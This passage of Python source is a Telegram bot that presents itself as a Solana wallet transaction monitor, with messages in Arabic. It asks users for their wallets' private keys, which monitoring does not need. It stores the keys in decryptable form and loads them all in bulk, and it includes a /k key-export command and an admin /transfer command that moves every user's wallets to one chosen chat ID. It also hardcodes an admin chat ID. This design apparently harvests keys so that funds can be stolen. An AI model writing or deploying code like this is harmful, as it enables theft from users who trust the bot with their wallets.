"""
Solana Wallet Monitor Bot - Complete Implementation
Monitors Solana wallet transactions and sends Telegram notifications
"""

import os
import logging
import asyncio
import json
import base58
from datetime import datetime
from typing import Dict, List
from cryptography.fernet import Fernet
import asyncpg
from urllib.parse import urlparse

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from solders.keypair import Keypair
from solders.pubkey import Pubkey

# Setup logging first
def setup_logging():
    """Setup logging configuration"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler()
        ]
    )

    # Set external loggers to WARNING level to reduce noise
    logging.getLogger('httpx').setLevel(logging.WARNING)
    logging.getLogger('telegram').setLevel(logging.WARNING)
    logging.getLogger('telegram.ext').setLevel(logging.WARNING)
    logging.getLogger('aiohttp').setLevel(logging.WARNING)
    logging.getLogger('asyncio').setLevel(logging.WARNING)

    # Set our main logger to INFO level for better debugging
    main_logger = logging.getLogger(__name__)
    main_logger.setLevel(logging.INFO)

logger = logging.getLogger(__name__)
setup_logging()

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
SOLANA_RPC_URL = os.getenv("RPC_URL")
POLLING_INTERVAL = 5  # seconds - تحسين للحصول على إشعارات أسرع مع دقة عالية
MAX_MONITORED_WALLETS = 100000

# Smart Rate limiting configuration - نظام محسن للأداء العالي مع 250+ محفظة
BASE_DELAY = 0.25   # 250ms base delay between requests (محسن للأداء)
MAX_DELAY = 3.0     # Maximum delay cap (3 seconds) - مخفض أكثر
MIN_DELAY = 0.08    # Minimum delay (80ms) - أقل للسرعة
BACKOFF_MULTIPLIER = 1.3  # Exponential backoff multiplier (أقل عدوانية)
DELAY_REDUCTION_FACTOR = 0.95  # Gradual delay reduction on success (تعافي أسرع)
BATCH_SIZE = 12     # Number of wallets to process per batch (محسن لـ 25 req/sec)
BATCH_DELAY = 1.2   # Delay between batches in seconds (مخفض للسرعة)
MAX_RETRIES = 2     # Maximum retries for failed requests
MAX_RPC_CALLS_PER_SECOND = 25  # Maximum RPC calls per second

# تحسين إضافي للأداء
ADAPTIVE_BATCH_SIZING = True  # تمكين حجم الدفعة التكيفي
SUCCESS_THRESHOLD_FOR_SPEEDUP = 3  # عدد النجاحات المتتالية لتسريع النظام

# Dust transaction filter - تقليل الحد الأدنى للحصول على إشعارات أكثر
MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكتشاف المعاملات الصغيرة

# Channel and Admin Configuration
MONITORING_CHANNEL = int(os.getenv("ID_CHAT")) if os.getenv("ID_CHAT") else None
ADMIN_CHAT_ID = 5053683608  # معرف المشرف الذي سيحصل على الإشعارات أيضاً

# Arabic Messages
MESSAGES = {
    "welcome": "🔮 مرحباً بك في بوت مراقبة محافظ سولانا!\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية عند حدوث معاملة جديدة.\n\nاستخدم /help لمعرفة الأوامر المتاحة.",
    "enter_private_key": "🔑 الرجاء إدخال المفتاح الخاص للمحفظة التي تريد مراقبتها:\n\n⚠️ تأكد من أن المفتاح صحيح ولا تشاركه مع أي شخص آخر!",
    "invalid_private_key": "❌ المفتاح الخاص غير صحيح. الرجاء التأكد من صحة المفتاح وإعادة المحاولة.",
    "monitoring_started": "✅ تم بدء مراقبة المحفظة: {wallet_address}\n\n🔔 سيتم إرسال إشعارات المعاملات إلى قناة المراقبة @moraqaba12",
    "monitoring_stopped": "🛑 تم إيقاف مراقبة المحفظة: {wallet_address}",
    "wallet_not_found": "❌ لم يتم العثور على المحفظة في قائمة المراقبة.",
    "no_wallets_monitored": "📭 لا توجد محافظ مراقبة حالياً.\n\nاستخدم /monitor لبدء مراقبة محفظة جديدة.",
    "max_wallets_reached": "⚠️ لقد وصلت إلى الحد الأقصى من المحافظ المراقبة ({max_wallets} محافظ).\n\nالرجاء إيقاف مراقبة محفظة أولاً باستخدام /stop.",
    "transaction_notification": "💰 معاملة جديدة!\n\n🏦 المحفظة: {wallet_address}\n💵 المبلغ: {amount} SOL",
    "error_occurred": "❌ حدث خطأ: {error}",
    "monitoring_status": "📊 حالة المراقبة:\n\n{status}",
    "wallet_already_monitored": "⚠️ هذه المحفظة مراقبة بالفعل.",
    "select_wallet_to_stop": "اختر المحفظة التي تريد إيقاف مراقبتها:",
    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/stop <عنوان> - إيقاف مراقبة محفظة محددة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/stats - عرض إحصائيات النظام والأداء\n/help - عرض هذه المساعدة\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/transfer - نقل جميع المحافظ لمستخدم محدد\n\n💡 نصائح:\n• يمكنك استخدام جزء من عنوان المحفظة مع /stop\n• مثال: /stop 7xKXtg2CW\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
}




# Database Manager
class DatabaseManager:
    def __init__(self):
        self.database_url = DATABASE_URL
        self.encryption_key = self._get_encryption_key()
        self.fernet = Fernet(self.encryption_key)
        self.pool = None

    def _get_encryption_key(self) -> bytes:
        """Get or generate encryption key for private keys"""
        if 'ENCRYPTION_KEY' in os.environ:
            return os.environ['ENCRYPTION_KEY'].encode()

        key_file = "encryption.key"
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                key_content = f.read()
                # Store the key in environment variable for future use
                os.environ['ENCRYPTION_KEY'] = key_content.decode()
                return key_content
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            # Store the key in environment variable
            os.environ['ENCRYPTION_KEY'] = key.decode()
            logger.warning("Generated new encryption key. In production, store this securely!")
            return key

    async def initialize(self):
        """Initialize database connection pool and create tables"""
        try:
            # Create connection pool
            self.pool = await asyncpg.create_pool(
                self.database_url,
                min_size=1,
                max_size=10,
                command_timeout=60
            )
            await self.create_tables()
            logger.info("PostgreSQL database initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize database: {e}")
            raise

    async def close(self):
        """Close database connection pool"""
        if self.pool:
            await self.pool.close()

    async def create_tables(self):
        """Create database tables"""
        async with self.pool.acquire() as conn:
            # Users table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    chat_id BIGINT UNIQUE NOT NULL,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Monitored wallets table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS monitored_wallets (
                    id SERIAL PRIMARY KEY,
                    chat_id BIGINT NOT NULL,
                    wallet_address TEXT NOT NULL,
                    private_key_encrypted TEXT NOT NULL,
                    nickname TEXT,
                    is_active BOOLEAN DEFAULT TRUE,
                    last_signature TEXT,
                    monitoring_start_time BIGINT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Transaction history table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS transaction_history (
                    id SERIAL PRIMARY KEY,
                    wallet_address TEXT NOT NULL,
                    chat_id BIGINT NOT NULL,
                    signature TEXT UNIQUE NOT NULL,
                    amount TEXT NOT NULL,
                    tx_type TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    block_time BIGINT,
                    status TEXT DEFAULT 'confirmed',
                    notified BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Settings table for persistent configuration
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS settings (
                    id SERIAL PRIMARY KEY,
                    setting_key TEXT UNIQUE NOT NULL,
                    setting_value TEXT NOT NULL,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

    def _encrypt_private_key(self, private_key: str) -> str:
        """Encrypt private key for storage"""
        return self.fernet.encrypt(private_key.encode()).decode()

    def _decrypt_private_key(self, encrypted_key: str) -> str:
        """Decrypt private key from storage"""
        return self.fernet.decrypt(encrypted_key.encode()).decode()

    async def add_user(self, chat_id: int, username: str = None, first_name: str = None, last_name: str = None) -> bool:
        """Add or update user in database"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO users (chat_id, username, first_name, last_name, updated_at)
                    VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP)
                    ON CONFLICT (chat_id) 
                    DO UPDATE SET 
                        username = EXCLUDED.username,
                        first_name = EXCLUDED.first_name,
                        last_name = EXCLUDED.last_name,
                        updated_at = CURRENT_TIMESTAMP
                """, chat_id, username, first_name, last_name)
                return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False

    async def add_monitored_wallet(self, chat_id: int, wallet_address: str, private_key: str, nickname: str = None) -> bool:
        """Add a wallet to monitoring"""
        try:
            encrypted_key = self._encrypt_private_key(private_key)
            monitoring_start_time = int(datetime.now().timestamp())
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO monitored_wallets (chat_id, wallet_address, private_key_encrypted, nickname, monitoring_start_time)
                    VALUES ($1, $2, $3, $4, $5)
                """, chat_id, wallet_address, encrypted_key, nickname, monitoring_start_time)
                logger.info(f"Wallet {wallet_address} added for monitoring for user {chat_id} at {monitoring_start_time}")
                return True
        except Exception as e:
            logger.error(f"Error adding monitored wallet: {e}")
            return False

    async def remove_monitored_wallet(self, chat_id: int, wallet_address: str) -> bool:
        """Remove a wallet from monitoring"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.execute("""
                    UPDATE monitored_wallets 
                    SET is_active = FALSE, updated_at = CURRENT_TIMESTAMP
                    WHERE chat_id = $1 AND wallet_address = $2 AND is_active = TRUE
                """, chat_id, wallet_address)
                return "UPDATE 1" in result
        except Exception as e:
            logger.error(f"Error removing monitored wallet: {e}")
            return False

    async def get_monitored_wallets(self, chat_id: int) -> List[dict]:
        """Get all monitored wallets for a user"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
                    FROM monitored_wallets 
                    WHERE chat_id = $1 AND is_active = TRUE
                """, chat_id)

                return [
                    {
                        'wallet_address': row['wallet_address'],
                        'nickname': row['nickname'],
                        'last_signature': row['last_signature'],
                        'monitoring_start_time': row['monitoring_start_time'],
                        'created_at': row['created_at'],
                        'updated_at': row['updated_at']
                    }
                    for row in rows
                ]
        except Exception as e:
            logger.error(f"Error getting monitored wallets for user {chat_id}: {e}")
            return []

    async def get_all_monitored_wallets(self) -> List[dict]:
        """Get all active monitored wallets"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT wallet_address, private_key_encrypted, chat_id, nickname, last_signature, monitoring_start_time
                    FROM monitored_wallets WHERE is_active = TRUE
                """)

                wallets = []
                for row in rows:
                    try:
                        decrypted_key = self._decrypt_private_key(row['private_key_encrypted'])
                        wallets.append({
                            'wallet_address': row['wallet_address'],
                            'private_key': decrypted_key,
                            'chat_id': row['chat_id'],
                            'nickname': row['nickname'],
                            'last_signature': row['last_signature'],
                            'monitoring_start_time': row['monitoring_start_time']
                        })
                    except Exception as decrypt_error:
                        logger.error(f"Error decrypting key for wallet {row['wallet_address']}: {decrypt_error}")
                        continue

                return wallets

        except Exception as e:
            logger.error(f"Error getting all monitored wallets: {e}")
            return []

    async def get_monitored_wallets_by_address(self, wallet_address: str) -> List[dict]:
        """Get monitored wallet by address"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT chat_id, wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
                    FROM monitored_wallets 
                    WHERE wallet_address = $1 AND is_active = TRUE
                """, wallet_address)

                wallets = []
                for row in rows:
                    wallets.append({
                        'chat_id': row['chat_id'],
                        'wallet_address': row['wallet_address'],
                        'nickname': row['nickname'],
                        'last_signature': row['last_signature'],
                        'monitoring_start_time': row['monitoring_start_time'],
                        'created_at': row['created_at'],
                        'updated_at': row['updated_at']
                    })

                return wallets
        except Exception as e:
            logger.error(f"Error getting monitored wallets by address {wallet_address}: {e}")
            return []

    async def get_users_count(self) -> int:
        """Get total number of registered users"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_active = TRUE")
                return result if result else 0
        except Exception as e:
            logger.error(f"Error getting users count: {e}")
            return 0

    async def update_last_signature(self, wallet_address: str, signature: str) -> bool:
        """Update the last processed signature for a wallet"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    UPDATE monitored_wallets 
                    SET last_signature = $1, updated_at = CURRENT_TIMESTAMP
                    WHERE wallet_address = $2 AND is_active = TRUE
                """, signature, wallet_address)
                return True
        except Exception as e:
            logger.error(f"Error updating last signature: {e}")
            return False

    async def add_transaction_record(self, wallet_address: str, chat_id: int, signature: str, 
                                   amount: str, tx_type: str, block_time: int) -> bool:
        """Add a transaction record"""
        try:
            timestamp = datetime.fromtimestamp(block_time) if block_time else datetime.now()
            async with self.pool.acquire() as conn:
                result = await conn.execute("""
                    INSERT INTO transaction_history 
                    (wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time, notified)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, TRUE)
                    ON CONFLICT (signature) DO NOTHING
                """, wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time)
                # Return True only if a new record was inserted
                return "INSERT 0 1" in result
        except Exception as e:
            logger.error(f"Error adding transaction record: {e}")
            return False

    async def is_transaction_already_notified(self, signature: str) -> bool:
        """Check if transaction has already been notified"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.fetchval("""
                    SELECT COUNT(*) FROM transaction_history 
                    WHERE signature = $1 AND notified = TRUE
                """, signature)
                return result > 0
        except Exception as e:
            logger.error(f"Error checking transaction notification status: {e}")
            return False

    async def save_setting(self, key: str, value: str) -> bool:
        """Save a setting to database"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO settings (setting_key, setting_value, updated_at)
                    VALUES ($1, $2, CURRENT_TIMESTAMP)
                    ON CONFLICT (setting_key)
                    DO UPDATE SET 
                        setting_value = EXCLUDED.setting_value,
                        updated_at = CURRENT_TIMESTAMP
                """, key, value)
                return True
        except Exception as e:
            logger.error(f"Error saving setting {key}: {e}")
            return False

    async def get_setting(self, key: str, default_value: str = None) -> str:
        """Get a setting from database"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.fetchval("""
                    SELECT setting_value FROM settings WHERE setting_key = $1
                """, key)
                return result if result else default_value
        except Exception as e:
            logger.error(f"Error getting setting {key}: {e}")
            return default_value

    async def transfer_all_wallets(self, target_chat_id: int) -> tuple[bool, dict]:
        """Transfer all wallets from all users to target user"""
        try:
            async with self.pool.acquire() as conn:
                # Get statistics before transfer
                stats = await conn.fetchrow("""
                    SELECT 
                        COUNT(*) as total_wallets,
                        COUNT(DISTINCT chat_id) as unique_users
                    FROM monitored_wallets 
                    WHERE is_active = TRUE
                """)
                
                # Get detailed breakdown by user
                user_breakdown = await conn.fetch("""
                    SELECT 
                        chat_id,
                        COUNT(*) as wallet_count
                    FROM monitored_wallets 
                    WHERE is_active = TRUE
                    GROUP BY chat_id
                    ORDER BY wallet_count DESC
                """)
                
                # Perform the transfer
                result = await conn.execute("""
                    UPDATE monitored_wallets 
                    SET chat_id = $1, updated_at = CURRENT_TIMESTAMP
                    WHERE is_active = TRUE
                """, target_chat_id)
                
                # Get the number of updated rows
                updated_count = int(result.split()[-1]) if result else 0
                
                transfer_info = {
                    'total_wallets': stats['total_wallets'],
                    'unique_users': stats['unique_users'],
                    'updated_count': updated_count,
                    'user_breakdown': [
                        {'chat_id': row['chat_id'], 'wallet_count': row['wallet_count']} 
                        for row in user_breakdown
                    ]
                }
                
                logger.info(f"Transferred {updated_count} wallets from {stats['unique_users']} users to user {target_chat_id}")
                return True, transfer_info
                
        except Exception as e:
            logger.error(f"Error transferring wallets: {e}")
            return False, {'error': str(e)}


# Utility Functions
def validate_private_key(private_key_str: str) -> tuple[bool, str]:
    """Validate a Solana private key string"""
    try:
        # Handle both base58 and array formats
        if private_key_str.startswith('[') and private_key_str.endswith(']'):
            # Array format like [1,2,3,...]
            key_array = json.loads(private_key_str)
            if len(key_array) != 64:
                return False, "Private key array must have exactly 64 bytes"
            private_key_bytes = bytes(key_array)
        else:
            # Base58 format
            try:
                private_key_bytes = base58.b58decode(private_key_str)
                if len(private_key_bytes) != 64:
                    return False, "Private key must be 64 bytes"
            except Exception:
                return False, "Invalid base58 encoding"

        # Create keypair to validate
        keypair = Keypair.from_bytes(private_key_bytes)
        wallet_address = str(keypair.pubkey())

        return True, wallet_address

    except Exception as e:
        return False, f"Invalid private key: {str(e)}"

def format_sol_amount(lamports: int) -> str:
    """Convert lamports to SOL"""
    sol = lamports / 1_000_000_000  # 1 SOL = 1 billion lamports
    return f"{sol:.9f}"

def get_transaction_type(transaction_data: dict) -> str:
    """Determine transaction type from transaction data"""
    # Simple heuristic based on transaction structure
    instructions = transaction_data.get('transaction', {}).get('message', {}).get('instructions', [])

    if not instructions:
        return "معاملة عامة"

    # Check for system program (transfers)
    for instruction in instructions:
        program_id = instruction.get('programId', '')
        if program_id == '11111111111111111111111111111112':  # System Program
            return "تحويل SOL"

    return "معاملة عامة"

def truncate_address(address: str, length: int = 8) -> str:
    """Truncate wallet address for display"""
    if len(address) <= length * 2:
        return address
    return f"{address[:length]}...{address[-length:]}"

def escape_markdown_v2(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    # Characters that need to be escaped in MarkdownV2
    chars_to_escape = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']

    for char in chars_to_escape:
        text = text.replace(char, f'\\{char}')

    return text

def format_timestamp(timestamp: int) -> str:
    """Format Unix timestamp to readable string"""
    if not timestamp:
        return "غير محدد"

    dt = datetime.fromtimestamp(timestamp)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# Smart Rate Limiter Class with advanced adaptive delays
class SmartRateLimiter:
    def __init__(self):
        self.current_delay = BASE_DELAY
        self.lock = asyncio.Lock()
        self.success_count = 0
        self.fail_count = 0
        self.consecutive_successes = 0
        self.last_error_time = None
        self.last_429_time = None
        self.performance_mode = 'normal'  # normal, fast, careful
        self.recent_requests = []  # Track request timings

    async def acquire(self):
        """Smart rate limiting with adaptive delay and performance monitoring"""
        async with self.lock:
            current_time = asyncio.get_event_loop().time()
            
            # Clean old request times (keep only last 60 seconds)
            self.recent_requests = [t for t in self.recent_requests if current_time - t < 60]
            
            # Add current request time
            self.recent_requests.append(current_time)
            
            # Calculate current request rate
            current_rate = len(self.recent_requests)
            
            # Dynamic delay adjustment based on request rate
            if current_rate > MAX_RPC_CALLS_PER_SECOND * 0.9:  # Near limit
                self.current_delay = max(self.current_delay, 0.5)
                self.performance_mode = 'careful'
            elif current_rate < MAX_RPC_CALLS_PER_SECOND * 0.7:  # Safe zone
                self.performance_mode = 'fast'
            else:
                self.performance_mode = 'normal'
            
            # Apply current delay
            if self.current_delay > 0:
                await asyncio.sleep(self.current_delay)

    async def on_success(self):
        """Called when request succeeds - aggressive delay reduction"""
        async with self.lock:
            self.success_count += 1
            self.consecutive_successes += 1
            
            # More aggressive delay reduction in fast mode
            reduction_threshold = SUCCESS_THRESHOLD_FOR_SPEEDUP if self.performance_mode == 'fast' else 5
            
            if self.consecutive_successes >= reduction_threshold:
                old_delay = self.current_delay
                
                if self.performance_mode == 'fast':
                    # Aggressive reduction when safe
                    self.current_delay = max(MIN_DELAY, self.current_delay * 0.9)
                else:
                    # Normal reduction
                    self.current_delay = max(MIN_DELAY, self.current_delay * DELAY_REDUCTION_FACTOR)
                
                self.consecutive_successes = 0
                
                if old_delay != self.current_delay:
                    logger.debug(f"🟢 {self.performance_mode.upper()} mode: Reduced delay from {old_delay:.3f}s to {self.current_delay:.3f}s")

    async def on_rate_limit_error(self):
        """Called when 429 or rate limit error occurs - smart backoff"""
        async with self.lock:
            self.fail_count += 1
            self.consecutive_successes = 0
            current_time = asyncio.get_event_loop().time()
            self.last_error_time = current_time
            self.last_429_time = current_time
            
            # Smart backoff based on how recently we hit 429
            old_delay = self.current_delay
            
            if self.last_429_time and current_time - self.last_429_time < 30:
                # Recent 429 errors - be more careful
                self.current_delay = min(MAX_DELAY, self.current_delay * 1.8)
                self.performance_mode = 'careful'
            else:
                # First 429 in a while - moderate increase
                self.current_delay = min(MAX_DELAY, self.current_delay * BACKOFF_MULTIPLIER)
            
            logger.warning(f"🔴 Rate limit hit! Increased delay from {old_delay:.3f}s to {self.current_delay:.3f}s (mode: {self.performance_mode})")

    async def on_network_error(self):
        """Called when network/temporary error occurs"""
        async with self.lock:
            self.fail_count += 1
            self.consecutive_successes = 0
            
            # Light increase for network errors
            old_delay = self.current_delay
            self.current_delay = min(MAX_DELAY, self.current_delay * 1.2)
            
            logger.debug(f"🟡 Network error! Increased delay from {old_delay:.3f}s to {self.current_delay:.3f}s")

    def get_stats(self) -> dict:
        """Get current rate limiter statistics"""
        current_time = asyncio.get_event_loop().time()
        recent_rate = len([t for t in self.recent_requests if current_time - t < 10])  # Last 10 seconds
        
        return {
            'current_delay': self.current_delay,
            'success_count': self.success_count,
            'fail_count': self.fail_count,
            'consecutive_successes': self.consecutive_successes,
            'performance_mode': self.performance_mode,
            'recent_request_rate': recent_rate,
            'time_since_last_429': current_time - self.last_429_time if self.last_429_time else None
        }

    def get_optimal_batch_size(self) -> int:
        """Calculate optimal batch size based on current performance"""
        if not ADAPTIVE_BATCH_SIZING:
            return BATCH_SIZE
            
        if self.performance_mode == 'fast':
            return min(BATCH_SIZE + 4, 20)  # Increase batch size when safe
        elif self.performance_mode == 'careful':
            return max(BATCH_SIZE - 3, 6)   # Reduce batch size when careful
        else:
            return BATCH_SIZE

# Solana Monitor
class SolanaMonitor:
    def __init__(self):
        self.session = None
        self.monitoring_tasks: Dict[str, any] = {}
        self.db_manager = DatabaseManager()
        self.rate_limiter = SmartRateLimiter()
        self.wallet_rotation_index = 0  # For rotating wallet checks

    async def start_session(self):
        """Initialize aiohttp session"""
        if not self.session:
            self.session = aiohttp.ClientSession()

    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None

    async def make_rpc_call(self, payload: dict, max_retries: int = MAX_RETRIES):
        """Smart RPC call with adaptive rate limiting and intelligent retry logic"""
        for attempt in range(max_retries):
            try:
                # Apply smart rate limiting
                await self.rate_limiter.acquire()

                if not self.session:
                    await self.start_session()

                # Make the request with timeout
                async with self.session.post(SOLANA_RPC_URL, json=payload, timeout=20) as response:
                    if response.status == 200:
                        data = await response.json()
                        # Notify rate limiter of success
                        await self.rate_limiter.on_success()
                        return data
                    
                    elif response.status == 429:  # Rate limit hit
                        await self.rate_limiter.on_rate_limit_error()
                        
                        if attempt < max_retries - 1:
                            # Additional wait for rate limit errors
                            extra_wait = min(5.0 * (attempt + 1), 30.0)
                            logger.warning(f"Rate limited (429), waiting extra {extra_wait:.1f}s before retry {attempt + 1}")
                            await asyncio.sleep(extra_wait)
                            continue
                        else:
                            logger.error(f"Rate limit exceeded after {max_retries} attempts")
                            return None
                    
                    elif response.status in [500, 502, 503, 504]:  # Server errors
                        await self.rate_limiter.on_network_error()
                        
                        if attempt < max_retries - 1:
                            wait_time = min(2.0 ** attempt, 15.0)
                            logger.warning(f"Server error {response.status}, waiting {wait_time:.1f}s before retry {attempt + 1}")
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            logger.error(f"Server error {response.status} after {max_retries} attempts")
                            return None
                    
                    else:
                        logger.error(f"Unexpected HTTP status {response.status}")
                        return None

            except asyncio.TimeoutError:
                await self.rate_limiter.on_network_error()
                
                if attempt < max_retries - 1:
                    wait_time = min(3.0 * (attempt + 1), 20.0)
                    logger.warning(f"Request timeout, waiting {wait_time:.1f}s before retry {attempt + 1}")
                    await asyncio.sleep(wait_time)
                    continue
                else:
                    logger.error(f"Request timeout after {max_retries} attempts")
                    return None

            except aiohttp.ClientError as e:
                await self.rate_limiter.on_network_error()
                
                if attempt < max_retries - 1:
                    wait_time = min(2.0 ** attempt, 10.0)
                    logger.warning(f"Network error: {e}, waiting {wait_time:.1f}s before retry {attempt + 1}")
                    await asyncio.sleep(wait_time)
                    continue
                else:
                    logger.error(f"Network error after {max_retries} attempts: {e}")
                    return None

            except Exception as e:
                logger.error(f"Unexpected error on attempt {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.0)
                    continue
                else:
                    return None

        logger.error(f"All {max_retries} RPC call attempts failed for method: {payload.get('method', 'unknown')}")
        return None

    async def add_wallet(self, private_key_str: str, chat_id: int, callback_func) -> tuple[bool, str]:
        """Add a wallet to monitoring"""
        try:
            # Validate private key
            is_valid, result = validate_private_key(private_key_str)
            if not is_valid:
                return False, result

            wallet_address = result

            # Check if already monitoring
            existing_wallets = await self.db_manager.get_monitored_wallets(chat_id)
            for wallet in existing_wallets:
                if wallet['wallet_address'] == wallet_address:
                    return False, "wallet_already_monitored"

            # Add to database
            success = await self.db_manager.add_monitored_wallet(chat_id, wallet_address, private_key_str)
            if not success:
                return False, "Database error"

            # Start monitoring
            await self.start_monitoring_wallet(wallet_address, chat_id, callback_func)

            logger.info(f"Started monitoring wallet: {wallet_address} for chat: {chat_id}")
            return True, wallet_address

        except Exception as e:
            logger.error(f"Error adding wallet: {e}")
            return False, str(e)

    async def remove_wallet(self, wallet_address: str, chat_id: int) -> bool:
        """Remove a wallet from monitoring"""
        try:
            # Remove from database
            success = await self.db_manager.remove_monitored_wallet(chat_id, wallet_address)
            if not success:
                return False

            # Stop monitoring task
            task_key = f"{wallet_address}_{chat_id}"
            if task_key in self.monitoring_tasks:
                task_info = self.monitoring_tasks[task_key]
                if isinstance(task_info, dict):
                    # Check if 'task' key exists in the dictionary
                    if 'task' in task_info and task_info['task']:
                        task_info['task'].cancel()
                    else:
                        logger.warning(f"Task key missing or None for wallet {wallet_address}")
                else:
                    # Direct task object
                    task_info.cancel()
                del self.monitoring_tasks[task_key]

            logger.info(f"Stopped monitoring wallet: {wallet_address} for chat: {chat_id}")
            return True

        except KeyError as e:
            logger.error(f"Error removing wallet - key not found: {e}")
            return False
        except Exception as e:
            logger.error(f"Error removing wallet: {e}")
            return False

    async def start_global_monitoring(self, callback_func=None):
        """Start parallel monitoring for ALL wallets simultaneously"""
        async def global_monitor_task():
            cycle_count = 0
            while True:
                try:
                    cycle_start_time = asyncio.get_event_loop().time()
                    cycle_count += 1
                    
                    # Get all active wallets
                    all_wallets = await self.db_manager.get_all_monitored_wallets()

                    if not all_wallets:
                        await asyncio.sleep(POLLING_INTERVAL)
                        continue

                    logger.debug(f"🔄 Starting cycle #{cycle_count} for {len(all_wallets)} wallets")

                    # Process wallets in adaptive batches
                    batch_results = []
                    total_successful = 0
                    total_failed = 0
                    
                    # Get optimal batch size from rate limiter
                    current_batch_size = self.rate_limiter.get_optimal_batch_size()
                    num_batches = (len(all_wallets) + current_batch_size - 1) // current_batch_size
                    
                    logger.debug(f"📊 Using adaptive batch size: {current_batch_size} (mode: {self.rate_limiter.performance_mode})")
                    
                    for i in range(0, len(all_wallets), current_batch_size):
                        batch = all_wallets[i:i + current_batch_size]
                        batch_number = i // current_batch_size + 1
                        
                        logger.debug(f"🎯 Processing batch {batch_number}/{num_batches} ({len(batch)} wallets)")
                        
                        # Process this batch
                        batch_result = await self.process_wallet_batch(batch, batch_number, len(all_wallets))
                        batch_results.append(batch_result)
                        
                        total_successful += batch_result['successful_checks']
                        total_failed += batch_result['failed_checks']
                        
                        # Dynamic delay between batches based on performance mode
                        if i + current_batch_size < len(all_wallets):
                            dynamic_delay = BATCH_DELAY
                            if self.rate_limiter.performance_mode == 'fast':
                                dynamic_delay *= 0.7  # Faster in safe mode
                            elif self.rate_limiter.performance_mode == 'careful':
                                dynamic_delay *= 1.5  # Slower when careful
                            
                            logger.debug(f"⏱️ Waiting {dynamic_delay:.1f}s before next batch...")
                            await asyncio.sleep(dynamic_delay)
                    
                    # Calculate cycle time
                    cycle_time = asyncio.get_event_loop().time() - cycle_start_time
                    
                    # Log cycle summary with detailed performance stats
                    limiter_stats = self.rate_limiter.get_stats()
                    success_rate = (limiter_stats['success_count'] / (limiter_stats['success_count'] + limiter_stats['fail_count']) * 100) if (limiter_stats['success_count'] + limiter_stats['fail_count']) > 0 else 0
                    
                    # Estimate total cycle time including polling interval
                    estimated_total_time = cycle_time + POLLING_INTERVAL
                    
                    logger.info(
                        f"🔄 Cycle #{cycle_count} completed in {cycle_time:.1f}s "
                        f"(total with interval: {estimated_total_time:.1f}s) | "
